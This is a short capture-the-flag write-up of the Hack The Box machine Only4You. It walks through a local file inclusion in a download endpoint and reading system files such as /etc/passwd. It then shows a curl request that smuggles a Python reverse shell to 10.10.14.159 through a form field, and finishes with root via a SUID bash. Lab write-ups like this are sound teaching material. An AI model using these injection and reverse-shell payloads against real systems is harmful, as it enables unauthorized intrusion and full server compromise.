# HTB Only4You Solution

* Setup only4you in local /etc/hosts

* Open in browser, CTRL+U to open html source

* CTRL+F `.only4you` to find subdomain `beta.only4you.htb`

* Setup `beta.only4you.htb` in local /etc/hosts

* Get source code from beta.only4you.htb

* app.py:download doesn't use `send_from_directory` and checks requested
file allowing to change the requested file to our full path (LFI)

> js oneliner to get accessable arbitrary file (execute from beta.only4you.htb/list)
>
> ```js
> btn = document.getElementsByClassName("btn btn-primary my-2")[0]; btn.setAttribute("value", "/etc/hosts"); btn.click()
> ```
> 
> Using burpsuite I managed to get an equivalent curl 
> ```shell
> curl -d 'image=/etc/hosts' 'http://beta.only4you.htb/download'
> ```

* Get useful system files: 
  * `etc/nginx/nginx.conf` - Generally may be useful
  * `/etc/nginx/sites-available/default` - Get absolute paths to webservers 
  * `etc/passwd` - Get general users information

* Get non-beta app.py `/var/www/only4you.htb/app.py`
* Find and get form.py from app.py's sources `/var/www/only4you.htb/app.py`
* Create a proper payload (I extracted the tested part to `issecure_payload.py`)
* Extract payload to curl using burp


> curl -d 'name=asdasd&email=example%40gmail.com+%7C+python3+-c+%27import+os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.14.159%22%2C4273%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for+f+in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27&subject=asgsag&message=asgsag' 'http://only4you.htb/'


Use `linpeas.sh`. See that /usr/bin/bash has suid. `/usr/bin/bash -p`, rooted.